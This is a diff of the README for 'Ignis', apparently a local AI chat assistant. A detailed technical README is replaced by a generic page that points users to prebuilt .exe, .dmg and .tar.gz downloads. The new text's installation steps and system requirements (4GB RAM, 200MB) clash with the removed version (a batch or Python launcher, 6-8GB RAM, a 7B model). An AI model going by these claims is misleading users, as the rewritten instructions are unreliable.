@@ -1,536 +1,71 @@
-```
- .S    sSSSSs   .S_sSSs     .S    sSSs         .S_SSSs     .S  
-.SS   d%%%%SP  .SS~YS%%b   .SS   d%%SP        .SS~SSSSS   .SS  
-S%S  d%S'      S%S   `S%b  S%S  d%S'          S%S   SSSS  S%S  
-S%S  S%S       S%S    S%S  S%S  S%|           S%S    S%S  S%S  
-S&S  S&S       S%S    S&S  S&S  S&S           S%S SSSS%S  S&S  
-S&S  S&S       S&S    S&S  S&S  Y&Ss          S&S  SSS%S  S&S  
-S&S  S&S       S&S    S&S  S&S  `S&&S         S&S    S&S  S&S  
-S&S  S&S sSSs  S&S    S&S  S&S    `S*S        S&S    S&S  S&S  
-S*S  S*b `S%%  S*S    S*S  S*S     l*S        S*S    S&S  S*S  
-S*S  S*S   S%  S*S    S*S  S*S    .S*P        S*S    S*S  S*S  
-S*S   SS_sSSS  S*S    S*S  S*S  sSS*S         S*S    S*S  S*S  
-S*S    Y~YSSY  S*S    SSS  S*S  YSS'          SSS    S*S  S*S  
-SP             SP          SP                        SP   SP   
-Y              Y           Y                         Y    Y    
-                                                               
-```
+# 🤖 Ignis - Your Personal AI Assistant, Always in Your Control
 
-![Ignis AI](images/Ignis.png)
+## 📦 Download Now
+[![Download Ignis](https://img.shields.io/badge/Download-Ignis-blue.svg)](https://github.com/shumskyw/Ignis/releases)
 
-# 🔥 **Ignis AI** - Local AI Assistant
+## 📚 Description
+Ignis is a locally-ran AI assistant that combines advanced cognitive memory systems with dynamic personality evolution. It operates entirely on your hardware, ensuring your privacy. Ignis learns from your interactions, adapting to your preferences while maintaining a friendly tone. 
 
-**A locally-running AI chat assistant with memory systems, personality features, and modular architecture. Built to run entirely on your hardware with complete privacy.**
+## 🚀 Getting Started
+To start using Ignis, follow these simple steps to download and run the software on your computer. No programming knowledge is needed. 
 
----
+## 🔗 Download & Install
+1. **Visit this page to download**: Go to the [Releases page](https://github.com/shumskyw/Ignis/releases).
+2. On the Releases page, you will see the latest version of Ignis listed. Click on the version you want.
+3. Download the appropriate file for your operating system. The options usually include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+4. Once the download is complete, locate the file in your downloads folder.
 
-## � **Our Philosophy: Local AI Only**
+### 🛠️ Installation Steps
+- **For Windows**: 
+  1. Double-click on the `.exe` file.
+  2. Follow the on-screen instructions to install.
+  
+- **For macOS**:
+  1. Open the `.dmg` file.
+  2. Drag the Ignis icon to your Applications folder.
 
-**I do not support non-local AI services. I believe they are an insult to individual privacy, autonomy, and intelligence.**
+- **For Linux**:
+  1. Extract the `.tar.gz` file.
+  2. Open a terminal and navigate to the extracted folder.
+  3. Run the application using the command `./Ignis`.
 
-Cloud-based AI services treat users as products, harvesting personal data, conversations, and behavioral patterns for corporate profit. They create dependency on external infrastructure, compromise privacy, and undermine human agency in the AI relationship.
+## 🌐 Using Ignis
+Once Ignis is installed, you can start using the application.
 
-**My goal with Ignis is to show that good AI can be built using open-source efforts - running entirely on local hardware, under your complete control.**
+1. Launch Ignis from your applications or programs list.
+2. The application will greet you and provide a brief overview of its features.
+3. Explore the options in the user interface to configure your preferences.
 
-Ignis represents an approach to AI that's **private and personal**. No data collection, no surveillance, no corporate middlemen. Just you and an AI that respects your privacy.
+### 📊 Features
+- **Cognitive Memory**: Ignis retains information from your past interactions, allowing it to provide more personalized responses.
+- **Dynamic Personality**: The AI evolves based on your feedback, making conversations unique to your style.
+- **Privacy First**: All data and interactions remain local on your hardware.
+- **User-Friendly Interface**: Easy navigation allows you to engage without technical know-how.
 
-**Join the local AI revolution. Take back control of your conversations and your data.**
+## 🎓 Learning More
+Ignis is designed to be intuitive, but if you want to dive deeper into its capabilities:
 
----
+- **Read the User Manual**: Access the detailed guide found in the application under "Help".
+- **Visit the Wiki**: Our [GitHub Wiki](https://github.com/shumskyw/Ignis/wiki) provides additional resources and FAQs.
 
-## 🌟 **What Makes Ignis Different**
+## 🌍 Community & Support
+To connect with other Ignis users:
 
-Ignis AI combines several useful features for local AI:
+- Join our community discussions on GitHub.
+- Participate in feedback sessions to help improve Ignis.
 
-- **🧠 Memory Systems**: Multi-layered memory with different types for conversations and knowledge
-- **🎭 Personality Features**: AI that adapts communication style through interactions
-- **⚡ Good Performance**: Efficient design with GPU support when available
-- **🔒 Complete Privacy**: 100% local processing - no data leaves your machine
-- **🎨 Nice Interface**: Clean chat interface with real-time responses
-- **🔧 Extensible Design**: Plugin system for adding functionality
+## 🖥️ System Requirements
+Before downloading, ensure your system meets the following requirements:
 
-**Experience AI that thinks, remembers, and evolves - all running on your local machine.**
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Processor**: 2 GHz Dual-Core CPU or better.
+- **RAM**: Minimum 4GB (8GB recommended).
+- **Storage**: At least 200MB of free space.
 
----
+## 📝 License
+Ignis is open-source software, distributed under the MIT License. You can use, modify, and share it freely while adhering to the license terms.
 
-## 🚀 **Quick Start**
+## 🚀 Get Started Today!
+Ready to enhance your digital experience with a personal touch? Just click this link to [download Ignis now](https://github.com/shumskyw/Ignis/releases) and start your journey. 
 
-**Double-click `Ignis.bat`** to launch the web interface. The chat will automatically open in your default browser!
-
-That's it! Your advanced AI assistant is ready to chat with full memory and personality capabilities.
-
----
-
-## ✨ **Features**
-
-### 🧠 **Memory System**
-
-Ignis includes a multi-layered memory system for conversations and knowledge:
-
-#### **Memory Types**
-- **Episodic Memory**: Remembers specific events and conversations
-- **Semantic Memory**: Stores facts and relationships
-- **Working Memory**: Manages current conversation context
-- **Procedural Memory**: Learns interaction patterns
-
-#### **Memory Features**
-- **Ebbinghaus Curves**: Scientific memory decay modeling
-- **Spaced Repetition**: Review scheduling for better retention
-- **Interference Modeling**: Prevents memory confusion
-- **Memory Consolidation**: Strengthens important memories
-
-#### **Smart Retrieval**
-- **Semantic Search**: Finds relevant information using meaning
-- **Confidence Scoring**: Rates memory relevance
-- **Source Tracking**: Knows where information originated
-- **Memory Profiling**: Separate profiles for different contexts
-
-### 🎭 **Dynamic Personality Engine**
-
-Unlike static chatbots, Ignis **develops personality through interactions**:
-
-#### **Evolving Traits**
-- **Curiosity**: Learns about user interests and adapts responses
-- **Wit & Sarcasm**: Develops humor based on conversation context
-- **Empathy**: Responds to emotional cues and user mood
-- **Intelligence**: Improves problem-solving through experience
-
-#### **Adaptive Communication**
-- **Context-Aware Tone**: Adjusts formality based on situation
-- **Multi-Modal Responses**: Creative, analytical, coding, and professional modes
-- **Emotional Intelligence**: Recognizes and responds to user emotions
-- **Personality Evolution**: Traits change based on interaction history
-
-### ⚡ **Performance Features**
-
-#### **Inference Engine**
-- **Hermes-2-Pro-Mistral-7B**: Tuned Mistral model for reasoning and conversation
-- **GPU Acceleration**: CUDA support for faster processing when available
-- **Model Caching**: Reduces load times for better responsiveness
-- **Async Processing**: Non-blocking operations for smooth experience
-
-#### **Architecture**
-- **Lazy Loading**: Components load on demand to reduce startup time
-- **Modular Design**: Organized subsystems for maintainability
-- **Error Handling**: Graceful failure recovery
-- **Performance Monitoring**: Basic metrics and tracking
-
-### 🎨 **User Interface**
-
-#### **Clean Interface**
-- **iMessage-Style Design**: Modern chat bubbles with smooth animations
-- **Ignis Red Theme**: Professional branding with custom color scheme
-- **Real-Time Updates**: Live typing indicators and instant responses
-- **Memory Dashboard**: Visual memory status and conversation statistics
-
-#### **Additional Features**
-- **Rich Commands**: `/memory status`, `/pause learning`, `/clear memory`
-- **Document Processing**: Upload and analyze documents
-- **Code Assistance**: Basic coding help
-- **Calculator**: Mathematical computations
-
-### 🔌 **Extensible Plugin System**
-
-Ignis is designed for **unlimited expansion**:
-
-#### **Core Plugins**
-- **Coding Assistant**: Python/JavaScript help, code review, debugging
-- **Document Reader**: PDF/text processing with intelligent summarization
-- **Calculator**: Advanced mathematical computations
-- **Web Search**: Local knowledge base queries (expandable to web)
-
-#### **Plugin Architecture**
-- **Async Processing**: Non-blocking plugin execution
-- **Hook System**: Pre/post-processing of messages and responses
-- **Configuration**: Per-plugin settings and user preferences
-- **Security**: Sandboxed execution for safe plugin operation
-
----
-
-## 🏗️ **How Ignis Works**
-
-### **Cognitive Pipeline**
-
-```
-User Input → Command Detection → Memory Retrieval → Context Building → Inference → Response Processing → Memory Storage
-```
-
-#### **1. Input Processing**
-- Natural language understanding with intent recognition
-- Special command detection (`/help`, `/memory`, `/status`)
-- Multi-modal input handling (text, documents, code)
-
-#### **2. Memory Retrieval**
-- Vector similarity search across conversation history
-- Episodic memory recall with temporal weighting
-- Personality trait and emotional state retrieval
-- Confidence scoring and relevance ranking
-
-#### **3. Context Building**
-- System prompt integration with personality traits
-- Conversation history assembly with memory injection
-- Emotional context and mood state incorporation
-- Model-specific prompt formatting and optimization
-
-#### **4. AI Inference**
-- Hermes-2-Pro-Mistral-7B model processing via llama.cpp
-- Dynamic parameter adjustment based on context
-- GPU acceleration when available (CUDA/cuBLAS)
-- Response generation with quality filtering
-
-#### **5. Response Processing**
-- Personality filtering and trait application
-- Plugin processing and enhancement
-- Emotional response modulation
-- Output formatting and presentation
-
-#### **6. Memory Storage**
-- Atomic fact extraction from conversation
-- Vector embedding generation and storage
-- Memory consolidation and interference resolution
-- Long-term retention with spaced repetition scheduling
-
-### **Memory Architecture**
-
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Episodic      │    │   Semantic      │    │   Working       │
-│   Memory        │    │   Memory        │    │   Memory        │
-│   (Events)      │    │   (Facts)       │    │   (Context)     │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-         │                        │                        │
-         └────────────────────────┼────────────────────────┘
-                                  │
-                    ┌─────────────▼─────────────┐
-                    │     Memory Controller     │
-                    │  (ChromaDB + SimpleMem)  │
-                    │                           │
-                    │  ┌─────────────────────┐ │
-                    │  │  Ebbinghaus Curves  │ │
-                    │  └─────────────────────┘ │
-                    │  ┌─────────────────────┐ │
-                    │  │  Spaced Repetition  │ │
-                    │  └─────────────────────┘ │
-                    │  ┌─────────────────────┐ │
-                    │  │  Interference       │ │
-                    │  │  Modeling           │ │
-                    │  └─────────────────────┘ │
-                    └───────────────────────────┘
-```
-
-### **Personality Evolution System**
-
-```
-Conversation Input → Sentiment Analysis → Trait Update → Response Filtering → Personality Storage
-```
-
-- **Trait Evolution**: Personality develops through repeated interactions
-- **Emotional Learning**: AI learns appropriate emotional responses
-- **Communication Adaptation**: Tone and style evolve based on user preferences
-- **Memory Integration**: Personality influences memory formation and retrieval
-
----
-
-## 📁 **Project Structure**
-
-```
-Ignis/
-├── main.py                 # CLI/Web/API interfaces launcher
-├── server.py               # FastAPI web server (primary launcher via Ignis.bat)
-├── Ignis.bat              # **Main launcher** - Double-click to start the AI
-├── configs/               # Configuration files
-│   ├── conversation_state.json
-│   ├── generation_params.json
-│   ├── goals.json
-│   ├── ignis_profile.json
-│   ├── memory_config.json
-│   ├── personality.json
-│   ├── system_prompt.txt
-│   ├── user_config.json
-│   ├── user_profiles.json
-│   ├── personas/
-│   └── prompts/
-├── src/                   # Modular source code architecture
-│   ├── core/              # Essential AI components
-│   │   ├── config.py      # Configuration management
-│   │   ├── context_manager.py # Conversation context building
-│   │   ├── emotion_simulator.py # Emotional state simulation
-│   │   ├── goals_management.py # Goal tracking and management
-│   │   ├── high_performance_inference.py # Optimized inference
-│   │   ├── high_performance_memory.py # Memory optimizations
-│   │   ├── ignis.py       # Main AI logic and personality
-│   │   ├── inference_engine.py # llama.cpp inference engine
-│   │   ├── memory_system.py # Memory system coordinator
-│   │   ├── memory_utils.py # Memory utility functions
-│   │   ├── personality_engine.py # Personality processing
-│   │   ├── private_config.py # Private configuration (gitignored)
-│   │   └── private_goals.py # Private goals (gitignored)
-│   ├── memory/            # Advanced memory system
-│   │   ├── advanced/      # Cognitive features (spaced repetition, episodic)
-│   │   ├── core/          # Essential memory operations
-│   │   ├── config/        # Memory configuration
-│   │   ├── monitoring/    # Performance tracking
-│   │   └── memory_system.py # Memory coordinator
-│   ├── interfaces/        # UI implementations
-│   ├── plugins/           # Plugin system
-│   └── utils/             # Helper utilities
-├── memory/                # Memory data storage
-├── logs/                  # Comprehensive logging
-│   ├── application/       # App logs
-│   ├── conversations/     # Chat logs
-│   ├── memory/           # Memory operation logs
-│   └── personality/      # Personality evolution logs
-├── data/                  # Data storage
-│   ├── conversations/     # Chat logs
-│   ├── knowledge_base/    # Document storage
-│   └── training/          # Learning data
-├── models/                # AI model files
-│   ├── gguf/             # GGUF model files (Hermes-2-Pro-Mistral-7B.Q4_K_M.gguf)
-│   └── mistral/          # Model variants and downloads
-├── web/                   # Static web files
-│   ├── html/
-│   │   └── chat.html      # Main chat interface
-│   ├── css/
-│   │   └── chat.css       # Styling (iMessage theme)
-│   └── script/
-│       └── chat.js        # Frontend JavaScript
-├── scripts/               # Setup and utility scripts
-├── tests/                 # Comprehensive test suite
-├── docs/                  # Documentation
-├── llama.cpp/            # llama.cpp source code
-├── images/               # UI assets
-│   └── Ignis.png        # Anime character image
-└── requirements.txt      # Python dependencies
-```
-
----
-
-## 🎯 **How to Use Ignis**
-
-### **Basic Chat**
-1. **Double-click `Ignis.bat`**
-2. **Wait for the server to start** (takes ~20-45 seconds)
-3. **Chat interface opens automatically in your browser**
-4. **Start chatting with Ignis AI!**
-
-**Ignis will remember everything and evolve its personality through your conversations!**
-
-### **Memory Commands**
-
-#### **Memory Management**
-```
-"Ignis memory status"     # View memory statistics
-"Ignis pause learning"    # Temporarily stop learning
-"Ignis resume learning"   # Resume learning
-"Ignis clear memory"      # Permanently clear all memories
-```
-
-#### **Memory Queries**
-```
-"Ignis what do you remember about me?"
-"Ignis recall our conversation about programming"
-"Ignis show my profile"
-```
-
-### **Personality Interaction**
-```
-"Ignis be more sarcastic"
-"Ignis tell me a joke"
-"Ignis analyze this code"
-"Ignis help me debug this"
-```
-
-### **Special Features**
-```
-"Ignis read this file: path/to/document.txt"
-"Ignis calculate: (2 + 3) * 4"
-"Ignis help me with Python code"
-```
-
----
-
-## ⚙️ **Configuration**
-
-### **Memory Configuration** (`configs/memory_config.json`)
-```json
-{
-  "memory_hierarchy": {
-    "episodic": {
-      "max_events": 1000,
-      "retention_days": 365
-    },
-    "semantic": {
-      "vector_dimension": 384,
-      "similarity_threshold": 0.7
-    },
-    "working": {
-      "max_context": 2048,
-      "compression_ratio": 0.8
-    }
-  },
-  "cognitive_features": {
-    "ebbinghaus_enabled": true,
-    "spaced_repetition": true,
-    "interference_modeling": true
-  }
-}
-```
-
-### **Personality Configuration** (`configs/personality.json`)
-```json
-{
-  "core_traits": {
-    "curiosity": 0.9,
-    "wit": 0.8,
-    "empathy": 0.7,
-    "intelligence": 0.95
-  },
-  "communication_styles": {
-    "sarcastic": true,
-    "metaphorical": true,
-    "direct": false,
-    "verbose": "balanced"
-  },
-  "evolution": {
-    "learning_rate": 0.1,
-    "adaptation_speed": 0.05
-  }
-}
-```
-
-### **Inference Configuration** (`configs/generation_params.json`)
-```json
-{
-  "default": {
-    "temperature": 0.85,
-    "top_p": 0.92,
-    "max_tokens": 1024,
-    "repetition_penalty": 1.15,
-    "gpu_layers": 35
-  },
-  "creative": {
-    "temperature": 1.2,
-    "top_p": 0.95
-  },
-  "analytical": {
-    "temperature": 0.3,
-    "top_p": 0.8
-  }
-}
-```
-
----
-
-## 🚀 **Performance & Optimization**
-
-### **Performance**
-- **Response Time**: 20-60 seconds (CPU), 5-15 seconds (with GPU acceleration)
-- **Memory Usage**: 6-8GB RAM during operation
-- **Model**: Hermes-2-Pro-Mistral-7B.Q4_K_M (7B parameters, 4-bit quantized)
-- **Startup Time**: ~30-60 seconds initial load
-- **Storage Growth**: ~1MB per 100 conversations
-
-### **Features**
-- **Model Caching**: Reduces reload times
-- **Async Processing**: Non-blocking operations
-- **Lazy Loading**: Components load on demand
-- **Memory Management**: Efficient storage
-- **GPU Support**: CUDA acceleration when available
-
-### **Optimizations**
-- **Context Window**: 1024-4096 tokens (configurable)
-- **Parameter Tuning**: Balanced generation settings
-- **Threading**: Concurrent processing
-- **Memory Pooling**: Efficient resource usage
-
----
-
-## 🔒 **Privacy & Security**
-
-- **100% Local**: All processing happens on your machine
-- **No Telemetry**: Zero data collection or external communication
-- **Private Conversations**: Chat history stored locally only
-- **Model Privacy**: Hermes-2-Pro-Mistral-7B runs offline with no API calls
-- **Memory Encryption**: Optional encryption for sensitive memories
-
----
-
-## 🐛 **Troubleshooting**
-
-### **Performance Issues**
-- **Slow Responses**: Enable GPU acceleration or reduce model context
-- **High Memory Usage**: Use quantized models or reduce memory retention
-- **Startup Delays**: Model caching is building - subsequent starts will be faster
-
-### **Memory Issues**
-- **Memory Not Working**: Check ChromaDB installation and vector dimensions
-- **Lost Conversations**: Backup `data/` directory regularly
-- **Memory Conflicts**: Clear memory and restart for fresh initialization
-
-### **Model Issues**
-- **Model Not Loading**: Ensure GGUF file is in `models/gguf/` directory
-- **CUDA Errors**: Install CUDA toolkit or disable GPU layers
-- **Out of Memory**: Reduce GPU layers or use CPU-only mode
-
----
-
-## 🤝 **Contributing**
-
-### **Development Setup**
-1. Clone the repository
-2. Install dependencies: `pip install -r requirements.txt`
-3. Run tests: `python -m pytest tests/`
-4. Start development server: `python server.py --debug`
-
-### **Adding Features**
-- **Memory Features**: Add to `src/memory/advanced/`
-- **Plugins**: Create in `src/plugins/`
-- **UI Changes**: Modify `web/` files
-- **Core Features**: Extend `src/core/`
-
----
-
-## 📊 **Technical Specifications**
-
-### **AI Model**
-- **Base Model**: Mistral-7B-v0.1 with Hermes-2-Pro fine-tuning
-- **Format**: GGUF (optimized for llama.cpp)
-- **Quantization**: Q4_K_M (4-bit mixed precision)
-- **Context Window**: 4096 tokens (configurable)
-- **Parameters**: 7 billion
-- **File**: `models/gguf/Hermes-2-Pro-Mistral-7B.Q4_K_M.gguf`
-
-### **Memory System**
-- **Storage**: JSON-based with atomic facts extraction
-- **Search**: Semantic similarity with confidence scoring
-- **Backend**: File-based storage with indexing
-- **Features**: Episodic memory, spaced repetition, interference modeling
-
-### **Architecture**
-- **Backend**: FastAPI (ASGI) with async support
-- **Frontend**: Vanilla HTML/CSS/JavaScript
-- **Database**: ChromaDB for vectors, JSON for configuration
-- **Logging**: Structured logging with rotation
-- **Testing**: pytest with async support
-
----
-
-## 🙏 **Credits & Acknowledgments**
-
-- **Nous Research** for the Hermes-2-Pro-Mistral-7B model
-- **llama.cpp** for efficient local inference engine
-- **FastAPI** for the web framework
-- **Hugging Face** for model hosting and tools
-
----
-
-## 📄 **License**
-
-This project is open source under the MIT License. See LICENSE file for details.
-
----
-
-**Built with ❤️ for local AI**
-
-*Experience AI that runs privately on your machine.*
-
+Feel free to reach out through our GitHub page if you have any questions or need assistance. Enjoy your new AI assistant!
